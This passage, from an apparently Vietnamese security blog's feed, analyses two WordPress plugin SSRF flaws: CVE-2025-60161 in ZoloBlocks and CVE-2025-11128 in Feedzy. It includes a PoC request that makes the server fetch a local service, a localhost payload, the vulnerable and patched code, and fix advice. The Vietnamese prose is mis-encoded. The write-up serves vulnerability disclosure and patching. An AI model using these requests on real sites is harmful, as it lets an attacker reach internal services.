0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;action=zolo_demo_import&amp;amp;json_file_url=http://127.0.0.1:8001/metadata&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/result.png&#34; title=&#34;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-10-31-cve-2025-60161/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-31-cve-2025-60161/result.png&#39; alt=&#34;Result&#34; height=&#34;486&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-60161 l√† m·ªôt SSRF trong &lt;code&gt;demo_import()&lt;/code&gt; c·ªßa ZoloBlocks (‚â§ 2.3.11) do nh·∫≠n URL t·ª´ ng∆∞·ªùi d√πng v√† g·ªçi &lt;code&gt;wp_remote_get()&lt;/code&gt; m√† kh√¥ng ki·ªÉm tra. Endpoint cho ph√©p truy c·∫≠p kh√¥ng x√°c th·ª±c (&lt;code&gt;wp_ajax_nopriv_...&lt;/code&gt;). V·∫•n ƒë·ªÅ ƒë√£ ƒë∆∞·ª£c v√° trong &lt;strong&gt;2.3.12&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: kh√¥ng validate/whitelist URL tr∆∞·ªõc khi &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;·∫¢nh h∆∞·ªüng: site ch·∫°y ZoloBlocks ‚â§ 2.3.11; attacker c√≥ th·ªÉ truy v·∫•n d·ªãch v·ª• n·ªôi b·ªô (SSRF).&lt;/li&gt;&#xA;&lt;li&gt;Kh·∫Øc ph·ª•c nhanh: c·∫≠p nh·∫≠t l√™n &lt;strong&gt;2.3.12&lt;/strong&gt; ho·∫∑c ch·∫∑n endpoint &lt;code&gt;zolo_demo_import&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ph√≤ng ng·ª´a: whitelist/validate URL, gi·ªõi h·∫°n egress, b·∫£o v·ªá AJAX b·∫±ng nonce/quy·ªÅn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/zoloblocks/vulnerability/wordpress-zoloblocks-plugin-2-3-9-server-side-request-forgery-ssrf-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress ZoloBlocks Plugin &amp;lt;= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11128 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-30-cve-2025-11128/</link>
      <pubDate>Thu, 30 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-30-cve-2025-11128/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin RSS Aggregator c·ªßa Feedzy ‚Äì Feed to Post, Autoblogging, News &amp;amp; YouTube Video Feeds Aggregator cho WordPress b·ªã l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;code&gt;5.1.0&lt;/code&gt; th√¥ng qua h√†m &lt;code&gt;&#39;feedzy_sanitize_feeds&#39;&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn truy c·∫≠p ·ªü m·ª©c &lt;strong&gt;Subscriber&lt;/strong&gt; tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi c√°c ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ truy v·∫•n th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11128&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11128&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/feedzy-rss-feeds/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Feedzy Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Feedzy&lt;/strong&gt;: &lt;strong&gt;5.1.0&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;5.1.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Feedzy RSS Aggregator&lt;/strong&gt; ƒë√£ ƒëƒÉng k√Ω m·ªôt REST API endpoint t·∫°i &lt;code&gt;/feedzy/v1/feed/&lt;/code&gt;, cho ph√©p ng∆∞·ªùi d√πng g·ª≠i URL ƒë·ªÉ l·∫•y d·ªØ li·ªáu feed.&lt;br&gt;&#xA;Tuy nhi√™n, trong &lt;strong&gt;phi√™n b·∫£n 5.1.0&lt;/strong&gt;, endpoint n√†y ƒë∆∞·ª£c b·∫£o v·ªá l·ªèng l·∫ªo v√† c∆° ch·∫ø l·ªçc URL kh√¥ng an to√†n, d·∫´n ƒë·∫øn &lt;strong&gt;l·ªó h·ªïng SSRF (Server-Side Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function feedzy_register_rest_route() {&#xA;    register_rest_route(&#xA;        &amp;#39;feedzy/v1&amp;#39;,&#xA;        &amp;#39;/feed/&amp;#39;,&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;feedzy_rest_route&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return is_user_logged_in();&#xA;            },&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                &amp;#39;url&amp;#39;      =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_feeds&amp;#39; ),&#xA;                ),&#xA;                &amp;#39;category&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_categories&amp;#39; ),&#xA;                ),&#xA;            ),&#xA;        )&#xA;    );&#xA;}&#xA;&#xA;public function feedzy_sanitize_feeds( $input ) {&#xA;    if ( count( $input ) === 1 ) {&#xA;        $feed = esc_url( $input[0] );&#xA;        return $feed;&#xA;    } else {&#xA;        $feeds = array();&#xA;        foreach ( $input as $item ) {&#xA;            $feeds[] = esc_url( $item );&#xA;        }&#xA;        return $feeds;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint ch·ªâ ki·ªÉm tra &lt;code&gt;is_user_logged_in()&lt;/code&gt;, t·ª©c l√† b·∫•t k·ª≥ t√†i kho·∫£n ƒë√£ ƒëƒÉng nh·∫≠p n√†o (k·ªÉ c·∫£ Subscriber) ƒë·ªÅu c√≥ th·ªÉ g·ª≠i request.&lt;/li&gt;&#xA;&lt;li&gt;H√†m &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; ch·ªâ s·ª≠ d·ª•ng &lt;code&gt;esc_url()&lt;/code&gt; - h√†m n√†y ch·ªâ l√†m s·∫°ch chu·ªói URL ƒë·ªÉ hi·ªÉn th·ªã, kh√¥ng x√°c th·ª±c t√≠nh h·ª£p l·ªá hay gi·ªõi h·∫°n truy c·∫≠p n·ªôi b·ªô.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Do ƒë√≥, attacker c√≥ th·ªÉ g·ª≠i payload &lt;code&gt;url=http://localhost:8001/admin&lt;/code&gt; ƒë·ªÉ √©p server g·ª≠i request ƒë·∫øn d·ªãch v·ª• n·ªôi b·ªô ‚Üí SSRF.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function feedzy_register_rest_route() {&#xA;    register_rest_route(&#xA;        &amp;#39;feedzy/v1&amp;#39;,&#xA;        &amp;#39;/feed/&amp;#39;,&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;feedzy_rest_route&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( WP_REST_Request $request ) {&#xA;                $post_id = absint( $request-&amp;gt;get_param( &amp;#39;postId&amp;#39; ) );&#xA;                return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;            },&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                &amp;#39;url&amp;#39;      =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_feeds&amp;#39; ),&#xA;                ),&#xA;                &amp;#39;category&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_categories&amp;#39; ),&#xA;                ),&#xA;            ),&#xA;        )&#xA;    );&#xA;}&#xA;&#xA;public function feedzy_sanitize_feeds( $input ) {&#xA;    if ( count( $input ) === 1 ) {&#xA;        $feed = wp_http_validate_url( $input[0] );&#xA;        return $feed;&#xA;    } else {&#xA;        $feeds = array();&#xA;        foreach ( $input as $item ) {&#xA;            if ( wp_http_validate_url( $item ) ) {&#xA;                $feeds[] = esc_url_raw( $item );&#xA;            }&#xA;        }&#xA;        return $feeds;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gi·ªõi h·∫°n quy·ªÅn truy c·∫≠p REST API b·∫±ng &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt;, ch·ªâ cho ph√©p &lt;strong&gt;Editor&lt;/strong&gt; ho·∫∑c &lt;strong&gt;Admin&lt;/strong&gt; c√≥ quy·ªÅn g·ªçi endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Thay th·∫ø &lt;code&gt;esc_url()&lt;/code&gt; b·∫±ng &lt;code&gt;wp_http_validate_url()&lt;/code&gt;, ƒë·∫£m b·∫£o URL h·ª£p l·ªá, ch·ªâ ch·∫•p nh·∫≠n giao th·ª©c &lt;strong&gt;http&lt;/strong&gt;/&lt;strong&gt;https&lt;/strong&gt;, v√† lo·∫°i b·ªè ƒë·ªãa ch·ªâ n·ªôi b·ªô (&lt;code&gt;loopback&lt;/code&gt;, &lt;code&gt;localhost&lt;/code&gt;, &lt;code&gt;127.0.0.1...&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng &lt;code&gt;esc_url_raw()&lt;/code&gt; ƒë·ªÉ l∆∞u URL an to√†n m√† kh√¥ng t·ª± ƒë·ªông m√£ h√≥a l·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng 